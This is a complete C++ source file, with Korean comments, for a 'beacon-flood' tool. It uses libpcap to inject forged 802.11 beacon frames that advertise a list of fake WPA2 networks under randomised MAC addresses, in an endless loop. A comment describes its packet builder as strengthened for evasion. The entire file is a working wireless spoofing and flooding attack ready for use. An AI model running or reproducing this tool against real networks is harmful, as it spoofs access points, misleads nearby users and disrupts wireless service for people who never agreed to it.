#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <random>
#include <chrono>
#include <thread>
#include <unistd.h> // usleep

// ---------------------------------------------------------------------------
// [1] 랜덤 MAC 생성 클래스
// ---------------------------------------------------------------------------
class RandomMacGenerator {
public:
    RandomMacGenerator() {
        std::random_device rd;
        gen_.seed(rd());
        dist_ = std::uniform_int_distribution<uint16_t>(0, 255);
    }

    // 무작위 MAC 주소 6바이트 생성
    //  - 유니캐스트 & 로컬비트 세팅
    void generate(uint8_t mac[6]) {
        for (int i = 0; i < 6; i++) {
            mac[i] = static_cast<uint8_t>(dist_(gen_));
        }
        // 로컬 MAC & 유니캐스트
        mac[0] &= 0xFE; // 최하위 비트를 0 → 유니캐스트
        mac[0] |= 0x02; // 두 번째 비트를 1 → 로컬 관리 주소
    }

private:
    std::mt19937 gen_;
    std::uniform_int_distribution<uint16_t> dist_;
};

// ---------------------------------------------------------------------------
// (SSID, MAC) 페어
// ---------------------------------------------------------------------------
struct SsidMacPair {
    std::string ssid;
    uint8_t mac[6];
};

// ---------------------------------------------------------------------------
// [2] Beacon Packet Maker (우회기법 강화)
//   - Radiotap + 802.11 Beacon + Management IE
//   - Timestamp 증가
//   - WPA2(RSN) IE
//   - Extended Supported Rates IE
//   - HT Capabilities IE (802.11n 기본)
// ---------------------------------------------------------------------------

#pragma pack(push, 1)
struct BeaconHeader {
    // 802.11 Beacon Frame
    uint8_t  frame_control[2];
    uint8_t  duration[2];
    uint8_t  dest[6];      // FF:FF:FF:FF:FF:FF
    uint8_t  source[6];    // 임의 MAC
    uint8_t  bssid[6];     // 임의 MAC
    uint8_t  seq_ctrl[2];

    // Fixed parameters (12 bytes)
    uint64_t timestamp;
    uint16_t beacon_interval;
    uint16_t cap_info;
};
#pragma pack(pop)

// “HT Capabilities” IE (간단 버전)
static const uint8_t ht_cap_ie[] = {
    0x2d, // Tag = HT Capabilities (0x2D)
    0x1a, // Length = 26
    // HT Capabilities Info (2 bytes) - 예시
    0xef, 0x01, // (Green Field off, short GI 20MHz on, etc.)
    // A-MPDU Parameters (1 byte)
    0x17,
    // Supported MCS Set (16 bytes), 여기선 0xFF FF FF FF 00... / 예시
    0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // HT Extended Capabilities (2 bytes)
    0x00, 0x00,
    // Transmit Beamforming Capabilities (4 bytes)
    0x00, 0x00, 0x00, 0x00,
    // ASEL Capabilities (1 byte)
    0x00
};

// Extended Supported Rates IE
static const uint8_t ext_supp_rates_ie[] = {
    0x32, // Tag = 50 (Extended Supported Rates)
    0x04, // Length
    // 실제로는 더 길 수도 있음. 여기선 4개만 추가 예시(24, 36, 48, 54)
    0x30, // 24 Mbps
    0x48, // 36 Mbps
    0x60, // 48 Mbps
    0x6c  // 54 Mbps
};

class BeaconPacketMaker {
public:
    BeaconPacketMaker() {
        // Radiotap Header (8 bytes, present=0)
        static const uint8_t rtap[8] = {
            0x00, 0x00, // Radiotap Version
            0x08, 0x00, // Header length = 8
            0x00, 0x00, 0x00, 0x00 // Present flags=0
        };
        radiotap_.assign(rtap, rtap + sizeof(rtap));

        // Supported Rates IE
        static const uint8_t rates[10] = {
            0x01, // Tag = 1
            0x08, // Length = 8
            0x82, 0x84, 0x8b, 0x96, // 1,2,5.5,11
            0x0c, 0x12, 0x18, 0x24  // 6,9,12,18
        };
        supported_rates_.assign(rates, rates + 10);

        // DS Parameter IE (채널=6 예시)
        static const uint8_t ds[3] = {
            0x03, // Tag=3
            0x01, // Length=1
            0x06  // Channel=6
        };
        ds_parameter_.assign(ds, ds + 3);

        // WPA2(RSN) IE
        static const uint8_t rsn[22] = {
            0x30, 0x14, // Tag=RSN(0x30), Length=20
            0x01, 0x00, // version=1
            0x00, 0x0f, 0xac, 0x04, // group cipher=CCMP
            0x01, 0x00, // pairwise count=1
            0x00, 0x0f, 0xac, 0x04, // pairwise cipher=CCMP
            0x01, 0x00, // auth count=1
            0x00, 0x0f, 0xac, 0x02, // auth=PSK
            0x00, 0x00 // RSN caps
        };
        rsn_wpa2_.assign(rsn, rsn + 22);

        // HT Capabilities IE
        ht_cap_.assign(ht_cap_ie, ht_cap_ie + sizeof(ht_cap_ie));

        // Extended Supported Rates IE
        ext_supp_rates_.assign(ext_supp_rates_ie, ext_supp_rates_ie + sizeof(ext_supp_rates_ie));

        // Timestamp 증가용 기준시각
        start_time_ = std::chrono::steady_clock::now();
    }

    // 패킷 생성
    std::vector<uint8_t> build(const std::string &ssid, const uint8_t mac[6]) {
        std::vector<uint8_t> packet;

        // Radiotap
        packet.insert(packet.end(), radiotap_.begin(), radiotap_.end());

        // 802.11 Beacon Header
        BeaconHeader hdr;
        memset(&hdr, 0, sizeof(hdr));
        hdr.frame_control[0] = 0x80; // Type/Subtype=Beacon
        hdr.frame_control[1] = 0x00;
        memset(hdr.dest, 0xFF, 6);   // Broadcast
        memcpy(hdr.source, mac, 6);
        memcpy(hdr.bssid,  mac, 6);
        hdr.beacon_interval = 0x0064; // 100TU
        // 0x0411 = ESS(0x0001) + Privacy(0x0010) + ShortSlot(0x0400) 등
        hdr.cap_info = 0x0411;

        // Timestamp
        hdr.timestamp = getCurrentTimestamp();

        // BeaconHeader 삽입
        const uint8_t* hdr_ptr = reinterpret_cast<const uint8_t*>(&hdr);
        packet.insert(packet.end(), hdr_ptr, hdr_ptr + sizeof(hdr));

        // [IE 1] SSID
        auto ssidIE = makeSSID_IE(ssid);
        packet.insert(packet.end(), ssidIE.begin(), ssidIE.end());

        // [IE 2] Supported Rates
        packet.insert(packet.end(), supported_rates_.begin(), supported_rates_.end());

        // [IE 3] Extended Supported Rates
        packet.insert(packet.end(), ext_supp_rates_.begin(), ext_supp_rates_.end());

        // [IE 4] DS Parameter (채널=6)
        packet.insert(packet.end(), ds_parameter_.begin(), ds_parameter_.end());

        // [IE 5] RSN (WPA2)
        packet.insert(packet.end(), rsn_wpa2_.begin(), rsn_wpa2_.end());

        // [IE 6] HT Capabilities
        packet.insert(packet.end(), ht_cap_.begin(), ht_cap_.end());

        // *추가로 필요하면 WPS IE, Country IE, ERP IE, etc. 도 삽입 가능

        return packet;
    }

private:
    std::vector<uint8_t> makeSSID_IE(const std::string &ssid) {
        std::vector<uint8_t> ie;
        ie.push_back(0x00); // Tag=SSID
        ie.push_back(static_cast<uint8_t>(ssid.size())); 
        for (char c : ssid) {
            ie.push_back(static_cast<uint8_t>(c));
        }
        return ie;
    }

    uint64_t getCurrentTimestamp() {
        using namespace std::chrono;
        auto now = steady_clock::now();
        auto diff = now - start_time_;
        // Beacon Timestamp: 1µs 단위
        uint64_t microsecs = (uint64_t)duration_cast<microseconds>(diff).count();
        return microsecs;
    }

private:
    std::vector<uint8_t> radiotap_;
    std::vector<uint8_t> supported_rates_;
    std::vector<uint8_t> ds_parameter_;
    std::vector<uint8_t> rsn_wpa2_;

    std::vector<uint8_t> ht_cap_;          // 802.11n
    std::vector<uint8_t> ext_supp_rates_;  // 24,36,48,54 등

    std::chrono::steady_clock::time_point start_time_;
};

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main(int argc, char* argv[]) {
    if (argc != 3) {
        fprintf(stderr, "syntax : beacon-flood <interface> <ssid-list-file>\n");
        fprintf(stderr, "sample : beacon-flood mon0 ssid-list.txt\n");
        return -1;
    }

    const char* dev = argv[1];
    const char* ssid_file = argv[2];

    // (1) SSID 목록 읽기
    std::vector<std::string> ssid_list;
    {
        std::ifstream ifs(ssid_file);
        if (!ifs.is_open()) {
            std::cerr << "Failed to open ssid-list file: " << ssid_file << "\n";
            return -1;
        }
        std::string line;
        while (std::getline(ifs, line)) {
            if (line.empty()) continue;
            ssid_list.push_back(line);
        }
        ifs.close();
    }
    if (ssid_list.empty()) {
        std::cerr << "No SSID found in " << ssid_file << "\n";
        return -1;
    }

    // (2) pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        std::cerr << "pcap_open_live(" << dev << ") failed: " << errbuf << "\n";
        return -1;
    }

    // (3) (SSID, MAC) 쌍 준비 (프로그램 시작 시 한 번만 랜덤 MAC 생성)
    RandomMacGenerator macGen;
    std::vector<SsidMacPair> pairs;
    pairs.reserve(ssid_list.size());
    for (auto &s : ssid_list) {
        SsidMacPair p;
        p.ssid = s;
        macGen.generate(p.mac);
        pairs.push_back(p);
    }

    // (4) BeaconPacketMaker
    BeaconPacketMaker maker;

    // (5) Flooding Loop
    std::cout << "[*] Start beacon-flood on " << dev 
              << " with " << pairs.size() << " SSIDs\n";
    std::cout << "[*] Press Ctrl+C to stop.\n";
    std::cout << "[!] Make sure '" << dev << "' is on channel 6 (eg. sudo iwconfig " << dev << " channel 6)\n";

    // 무한 루프
    while (true) {
        for (auto &pm : pairs) {
            // 패킷 생성
            std::vector<uint8_t> packet = maker.build(pm.ssid, pm.mac);

            // 전송
            if (pcap_inject(handle, packet.data(), packet.size()) == -1) {
                std::cerr << "pcap_inject() failed: " << pcap_geterr(handle) << "\n";
            } else {
                // MAC 출력
                char macbuf[20];
                snprintf(macbuf, sizeof(macbuf),
                         "%02X:%02X:%02X:%02X:%02X:%02X",
                         pm.mac[0], pm.mac[1], pm.mac[2],
                         pm.mac[3], pm.mac[4], pm.mac[5]);
                std::cout << "[+] Beacon: SSID='" << pm.ssid 
                          << "', BSSID=" << macbuf << "\n";
            }

            // 너무 빠른 Flooding 방지
            usleep(30000); // 30ms
        }
    }

    pcap_close(handle);
    return 0;
}
